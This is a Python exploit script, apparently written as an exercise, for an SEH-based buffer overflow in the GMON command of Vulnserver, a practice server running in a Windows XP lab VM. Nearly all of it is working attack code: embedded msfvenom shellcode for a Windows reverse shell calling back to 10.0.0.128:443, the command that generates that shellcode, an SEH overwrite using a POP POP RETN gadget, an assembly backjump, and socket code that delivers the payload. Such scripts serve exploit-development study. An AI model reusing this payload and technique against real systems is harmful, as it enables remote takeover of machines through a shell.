#!/usr/bin/python

#=====================================#
# Vulnserver GMON SEH buffer overflow #
#           Author: purpl3f0x         #
#=====================================#

import socket
import os
import sys

host = "10.0.0.130"	# Windows XP VM
port = 9999			# VulnServer port

# Shellcode command:
# msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.128 lport=443 EXITFUNC=thread -b "\x00" -f c

shellcode = ("\xdb\xd7\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x52\xbe\xa2\x2d\xc0"
"\x56\x31\x72\x17\x83\xc2\x04\x03\xd0\x3e\x22\xa3\xe8\xa9\x20"
"\x4c\x10\x2a\x45\xc4\xf5\x1b\x45\xb2\x7e\x0b\x75\xb0\xd2\xa0"
"\xfe\x94\xc6\x33\x72\x31\xe9\xf4\x39\x67\xc4\x05\x11\x5b\x47"
"\x86\x68\x88\xa7\xb7\xa2\xdd\xa6\xf0\xdf\x2c\xfa\xa9\x94\x83"
"\xea\xde\xe1\x1f\x81\xad\xe4\x27\x76\x65\x06\x09\x29\xfd\x51"
"\x89\xc8\xd2\xe9\x80\xd2\x37\xd7\x5b\x69\x83\xa3\x5d\xbb\xdd"
"\x4c\xf1\x82\xd1\xbe\x0b\xc3\xd6\x20\x7e\x3d\x25\xdc\x79\xfa"
"\x57\x3a\x0f\x18\xff\xc9\xb7\xc4\x01\x1d\x21\x8f\x0e\xea\x25"
"\xd7\x12\xed\xea\x6c\x2e\x66\x0d\xa2\xa6\x3c\x2a\x66\xe2\xe7"
"\x53\x3f\x4e\x49\x6b\x5f\x31\x36\xc9\x14\xdc\x23\x60\x77\x89"
"\x80\x49\x87\x49\x8f\xda\xf4\x7b\x10\x71\x92\x37\xd9\x5f\x65"
"\x37\xf0\x18\xf9\xc6\xfb\x58\xd0\x0c\xaf\x08\x4a\xa4\xd0\xc2"
"\x8a\x49\x05\x44\xda\xe5\xf6\x25\x8a\x45\xa7\xcd\xc0\x49\x98"
"\xee\xeb\x83\xb1\x85\x16\x44\xb4\x59\x18\x14\xa0\x5b\x18\x15"
"\x8a\xd5\xfe\x7f\xfc\xb3\xa9\x17\x65\x9e\x21\x89\x6a\x34\x4c"
"\x89\xe1\xbb\xb1\x44\x02\xb1\xa1\x31\xe2\x8c\x9b\x94\xfd\x3a"
"\xb3\x7b\x6f\xa1\x43\xf5\x8c\x7e\x14\x52\x62\x77\xf0\x4e\xdd"
"\x21\xe6\x92\xbb\x0a\xa2\x48\x78\x94\x2b\x1c\xc4\xb2\x3b\xd8"
"\xc5\xfe\x6f\xb4\x93\xa8\xd9\x72\x4a\x1b\xb3\x2c\x21\xf5\x53"
"\xa8\x09\xc6\x25\xb5\x47\xb0\xc9\x04\x3e\x85\xf6\xa9\xd6\x01"
"\x8f\xd7\x46\xed\x5a\x5c\x66\x0c\x4e\xa9\x0f\x89\x1b\x10\x52"
"\x2a\xf6\x57\x6b\xa9\xf2\x27\x88\xb1\x77\x2d\xd4\x75\x64\x5f"
"\x45\x10\x8a\xcc\x66\x31")


Seh = "\xb4\x10\x50\x62"	# x625010b4 POP POP RETN from essfunc.dll
nSeh = "\xeb\x0f\x90\x90"	# Jump ahead 15 bytes to hit the function call in backjump
backjump = "\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF" #Decrement ECX by 768 bytes and jump to it

# backjump asm:
# POP ECX
# DEC CH
# DEC CH
# DEC CH
# CALL [relative -0D]

buffer = "A" * (3494 - 766)
buffer += "\x90" * 30
buffer += shellcode
buffer += "A" * (3494 - len(buffer))
buffer += nSeh
buffer += Seh
buffer += backjump
buffer += "C" * (5012 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print "[*] Connecting..."
print s.recv(1024)				# Receive the banner
print "[*] Sending buffer..."
s.send("GMON /.../" + buffer) 	# Send the buffer
print s.recv(1024)				# Receive response (if any)
s.close()						# Close the connection
